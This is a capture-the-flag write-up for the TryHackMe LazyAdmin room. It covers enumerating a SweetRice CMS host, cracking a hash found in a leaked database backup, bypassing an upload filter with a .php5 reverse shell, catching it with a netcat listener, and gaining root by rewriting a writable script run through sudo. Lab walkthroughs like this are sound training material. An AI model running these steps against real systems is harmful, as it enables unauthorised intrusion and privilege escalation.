[LazyAdmin Room](https://tryhackme.com/room/lazyadmin)
# Setup
Let's add our target to `/etc/hosts`:
```
sudo vim /etc/hosts
```
![[Pasted image 20260527030556.png]]

# Enumeration
## Service Enumeration
As always, `nmap`:
```bash
nmap -sS -sV -oN scan.txt 10.49.170.65

Nmap scan report for 10.49.170.65
Host is up (0.087s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's visit `lazyadmin.thm`:
![[Pasted image 20260527030735.png]]
Just a default Apache's page.

## Directory Enumeration
Let's run `gobuster` against the target:
```bash
gobuster dir -u http://lazyadmin.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
```
Result:
```bash
/content              (Status: 200) [Size: 324] [--> http://lazyadmin.thm/content/]
```

Let's visit, the page:
![[Pasted image 20260527031432.png]]
Now, we know that the target is using something called **SweetRice** as its CMS.
![[Pasted image 20260527031547.png]]
So, it is built with *PHP*.

I tried finding my way in by enumerating the subdomains, but nothing hits. then, I tried enumerating further with the `/content` and several endpoints were hit:
```bash
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/_themes              (Status: 301) [Size: 324] [--> http://lazyadmin.thm/content/_themes/]
/as                   (Status: 301) [Size: 319] [--> http://lazyadmin.thm/content/as/]
/attachment           (Status: 301) [Size: 327] [--> http://lazyadmin.thm/content/attachment/]
/images               (Status: 301) [Size: 323] [--> http://lazyadmin.thm/content/images/]
/inc                  (Status: 301) [Size: 320] [--> http://lazyadmin.thm/content/inc/]
/index.php            (Status: 200) [Size: 2199]
/js                   (Status: 301) [Size: 319] [--> http://lazyadmin.thm/content/js/]
```

At `/content/inc/mysql_backup` there was a database backup script:
![[Pasted image 20260527032023.png]]

Read the `file.sql` we get a bunch of `tables` structure, but there was something interesting:
![[Pasted image 20260527032204.png]]
It looks like a hash so let's try identify and possible decrypt it:
![[Pasted image 20260527032352.png]]

That was easy. Let's see something else. At `/content/as/` was a login page for admin:
![[Pasted image 20260527032515.png]]
I tried logging in as `admin:[redacted]`, but it failed. So, I lookup for the default user of `SweetRice`, I found `manager` is the default user:
![[Pasted image 20260527032701.png]]

Logging in and we were greeted with this:
![[Pasted image 20260527032752.png]]
## Vulnerability Exploitation
From some researches, I found that `SweetRice` is vulnerable to File Uploading that could result in reverse shell. So, I tried finding and found the file upload page is under Post --> Create:
![[Pasted image 20260527032933.png]]
It accepts `.db` file, but it won't accept `.php` file. So, I tried `.php5` which was successfully uploaded.
## Reverse Shell
Next, generate a reverse shell script, I use this shell specifically:
[php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

From the previous enumeration, I found `/content/attachment` is where our uploaded files get stored:
![[Pasted image 20260527033543.png]]

Next, run a `netcat` listener:
```bash
nc -lvnp 4444
```

Click on our `reverse.php5`, then we get the shell:
![[Pasted image 20260527033832.png]]

`Python3` exists so let's spawn a shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Let's run `sudo -l` to see what can we do and not:
![[Pasted image 20260527034614.png]]
We can run a program as root with no password, that's a good one.

Here we get the user's flag:
![[Pasted image 20260527033959.png]]

I tried logging into `mysql` and find any clues or sweet, but nothing pops. but `backup.pl` looks interesting. Let's read its content:
![[Pasted image 20260527034123.png]]
## Privilege Escalation
It calls another program, let's check its permissions:
![[Pasted image 20260527034213.png]]
BINGO, we can modify the script and it is own by root. So, let's rewrite the script to spawn a root shell:
```bash
echo "/bin/bash" > /etc/copy.sh
```

Run the script with `sudo` and we get the root shell:
```bash
www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
root@THM-Chal:/home/itguy# id
id
uid=0(root) gid=0(root) groups=0(root)
```
